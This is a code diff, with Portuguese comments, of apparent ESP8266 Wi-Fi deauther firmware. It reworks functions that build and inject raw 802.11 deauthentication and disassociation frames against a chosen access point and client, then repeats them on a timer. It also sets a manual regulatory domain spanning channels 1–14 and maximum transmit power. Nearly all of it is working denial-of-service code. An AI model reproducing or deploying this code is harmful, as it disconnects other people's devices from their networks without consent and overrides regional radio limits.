@@ -1,7 +1,6 @@
 /*
- * Deauth: Wi-PWN sendDeauths (4 frames) para STA unicast; com cliente broadcast
- * (FF:FF:...) so os 2 primeiros — esp8266_deauther v2 deauthDevice (TA nao pode ser broadcast).
- * Sucesso inject: wifi_send_pkt_freedom == 0 (Attack::sendPacket Spacehuhn v2).
+ * Deauth: Attack::deauthDevice + Attack::sendPacket (esp8266_deauther v2 Attack.cpp / Attack.h).
+ * Licenca MIT: https://github.com/SpacehuhnTech/esp8266_deauther
  */
 
 #include "deauther.h"
@@ -38,8 +37,6 @@ static constexpr unsigned long kDeauthPeriodMs =
 
 /** Cache de canal como functions.h:setWifiChannel no Spacehuhn. */
 static uint8_t s_wifiChannelCache = 255;
-/** Primeiro retorno de wifi_send_pkt_freedom na sessao (diagnostico). */
-static int s_lastFreedomRetSample = 0x7FFFFFFF;
 
 static void setWifiChannelSh(uint8_t ch, bool force)
 {
@@ -50,23 +47,15 @@ static void setWifiChannelSh(uint8_t ch, bool force)
   }
 }
 
-/** Manual: US cobre ch 1–11; acima disso usar dominio mais largo. */
-static void applyInjectionCountry(uint8_t targetCh)
+/** Politica manual ampla (comum em firmwares de teste de RF no ESP8266). */
+static void applyInjectionCountry()
 {
   wifi_country_t c;
   memset(&c, 0, sizeof(c));
+  strncpy(c.cc, "01", 3);
   c.schan = 1;
+  c.nchan = 14;
   c.policy = WIFI_COUNTRY_POLICY_MANUAL;
-  if (targetCh <= 11)
-  {
-    strncpy(c.cc, "US", 3);
-    c.nchan = 11;
-  }
-  else
-  {
-    strncpy(c.cc, "01", 3);
-    c.nchan = 14;
-  }
   wifi_set_country(&c);
 }
 
@@ -81,27 +70,13 @@ void restoreWifiRegAfterInjection()
   wifi_set_country(&c);
 }
 
-static bool sendRawPacket(uint8_t *packet, uint16_t packetSize, uint8_t ch)
+/** Attack::sendPacket — setWifiChannel + um unico wifi_send_pkt_freedom(..., 0). */
+static bool sendPacketSpacehuhn(uint8_t *packet, uint16_t packetSize, uint8_t ch,
+                                bool force_ch)
 {
-  setWifiChannelSh(ch, true);
+  setWifiChannelSh(ch, force_ch);
   yield();
-  int r = wifi_send_pkt_freedom(packet, packetSize, 0);
-  if (r != 0)
-  {
-    delayMicroseconds(400);
-    r = wifi_send_pkt_freedom(packet, packetSize, 1);
-  }
-  if (s_lastFreedomRetSample == 0x7FFFFFFF)
-  {
-    s_lastFreedomRetSample = r;
-    Serial.print(F("[deauther] wifi_send_pkt_freedom ret="));
-    Serial.print(r);
-    Serial.print(F(" opmode="));
-    Serial.print(wifi_get_opmode());
-    Serial.print(F(" ch="));
-    Serial.println(static_cast<int>(wifi_get_channel()));
-  }
-  const bool sent = (r == 0);
+  const bool sent = (wifi_send_pkt_freedom(packet, packetSize, 0) == 0);
   if (sent)
   {
     deautherPacketsSent++;
@@ -119,65 +94,62 @@ static bool macBroadcast(const uint8_t *mac)
   return memcmp(mac, bcast, 6) == 0;
 }
 
-/* Template 26 bytes — Wi-PWN Attack.h deauthPacket. */
-static const uint8_t kDeauthTemplate[26] = {
-    0xC0, 0x00, 0x00, 0x00, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
-    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
-    0x00, 0x00, 0x01, 0x00};
+/* Template 26 bytes — Attack.h (Spacehuhn v2) member deauthPacket. */
+static const uint8_t kDeauthPacket[26] = {
+    /* 0 - 1 */ 0xC0, 0x00,
+    /* 2 - 3 */ 0x00, 0x00,
+    /* 4 - 9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    /* 22 - 23 */ 0x00, 0x00,
+    /* 24 - 25 */ 0x01, 0x00};
 
-/** Wi-PWN Attack::buildDeauth: RA=addr4, TA=BSSID=addr10/16 (ambos _ap). */
-static void buildDeauthLikeWiPwn(uint8_t *pkt, const uint8_t *apMac,
-                                 const uint8_t *clientMac, uint8_t reason)
-{
-  memcpy(pkt, kDeauthTemplate, 26);
-  memcpy(&pkt[4], clientMac, 6);
-  memcpy(&pkt[10], apMac, 6);
-  memcpy(&pkt[16], apMac, 6);
-  pkt[24] = reason;
-}
-
-/**
- * Par AP->STA (deauth+disassoc); com STA unicast repete STA->AP (Wi-PWN sendDeauths).
- * Cliente broadcast: so o par inicial — senao TA=FF:FF... e o driver recusa (-1).
- */
-static bool deauthDeviceWiPwn(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
+/** Attack::deauthDevice (copia fiel da ordem de buffers e envios). */
+static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
 {
   if (!stMac)
   {
     return false;
   }
 
-  constexpr uint16_t packetSize = 26;
-  uint8_t pkt[packetSize];
   bool success = false;
+  constexpr uint16_t packetSize = 26;
 
-  buildDeauthLikeWiPwn(pkt, apMac, stMac, reason);
-  pkt[0] = 0xc0;
-  if (sendRawPacket(pkt, packetSize, ch))
+  uint8_t deauthpkt[packetSize];
+  memcpy(deauthpkt, kDeauthPacket, packetSize);
+  memcpy(&deauthpkt[4], stMac, 6);
+  memcpy(&deauthpkt[10], apMac, 6);
+  memcpy(&deauthpkt[16], apMac, 6);
+  deauthpkt[24] = reason;
+
+  deauthpkt[0] = 0xc0;
+  if (sendPacketSpacehuhn(deauthpkt, packetSize, ch, true))
   {
     success = true;
   }
-  delayMicroseconds(350);
 
-  pkt[0] = 0xa0;
-  if (sendRawPacket(pkt, packetSize, ch))
+  uint8_t disassocpkt[packetSize];
+  memcpy(disassocpkt, deauthpkt, packetSize);
+  disassocpkt[0] = 0xa0;
+  if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
   {
     success = true;
   }
-  delayMicroseconds(350);
 
   if (!macBroadcast(stMac))
   {
-    buildDeauthLikeWiPwn(pkt, stMac, apMac, reason);
-    pkt[0] = 0xc0;
-    if (sendRawPacket(pkt, packetSize, ch))
+    memcpy(&disassocpkt[4], apMac, 6);
+    memcpy(&disassocpkt[10], stMac, 6);
+    memcpy(&disassocpkt[16], stMac, 6);
+
+    disassocpkt[0] = 0xc0;
+    if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
     {
       success = true;
     }
-    delayMicroseconds(350);
 
-    pkt[0] = 0xa0;
-    if (sendRawPacket(pkt, packetSize, ch))
+    disassocpkt[0] = 0xa0;
+    if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
     {
       success = true;
     }
@@ -186,7 +158,10 @@ static bool deauthDeviceWiPwn(uint8_t *apMac, uint8_t *stMac, uint8_t reason, ui
   return success;
 }
 
-/** SoftAP off + STA puro; Arduino STA sincroniza com wifi_set_opmode (freedom costuma falhar se AP+desync). */
+/**
+ * Prepara RF para injecao sem derrubar o SoftAP nem o servidor web (uso tipico com UI ativa).
+ * Attack::sendPacket no v2 so muda canal; aqui mantemos AP+STA como no portal.
+ */
 static void prepareRadioForDeauthInjection(uint8_t channel)
 {
   wifi_promiscuous_enable(0);
@@ -194,25 +169,13 @@ static void prepareRadioForDeauthInjection(uint8_t channel)
   WiFi.setAutoReconnect(false);
   WiFi.setSleepMode(WIFI_NONE_SLEEP);
 
-  wifi_softap_dhcps_stop();
-  WiFi.softAPdisconnect(true);
-  delay(150);
+  WiFi.mode(WIFI_AP_STA);
+  delay(50);
 
-  WiFi.disconnect(true);
-  wifi_station_disconnect();
-  wifi_station_set_auto_connect(0);
-  wifi_station_set_reconnect_policy(0);
-  delay(100);
-
-  WiFi.mode(WIFI_STA);
-  delay(80);
-  wifi_set_opmode(STATION_MODE);
-  delay(100);
-
-  wifi_set_phy_mode(PHY_MODE_11B);
+  wifi_set_phy_mode(PHY_MODE_11N);
   system_phy_set_max_tpw(82);
 
-  applyInjectionCountry(channel);
+  applyInjectionCountry();
 
   s_wifiChannelCache = 255;
   if (channel >= 1 && channel <= 14)
@@ -220,7 +183,7 @@ static void prepareRadioForDeauthInjection(uint8_t channel)
     wifi_set_channel(channel);
     s_wifiChannelCache = channel;
   }
-  delay(80);
+  delay(50);
 }
 
 void initDeauther()
@@ -263,7 +226,6 @@ void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint
 {
   deautherPacketsSent = 0;
   deautherInjectFail = 0;
-  s_lastFreedomRetSample = 0x7FFFFFFF;
 
   memcpy(targetApMac, apMac, 6);
   memcpy(targetClientMac, clientMac, 6);
@@ -348,7 +310,7 @@ void updateDeauth()
 {
   if (attackActive && (millis() - lastAttackPacketAt >= kDeauthPeriodMs))
   {
-    deauthDeviceWiPwn(targetApMac, targetClientMac, attackReason, targetChannel);
+    deauthDeviceSpacehuhn(targetApMac, targetClientMac, attackReason, targetChannel);
     lastAttackPacketAt = millis();
   }
 }
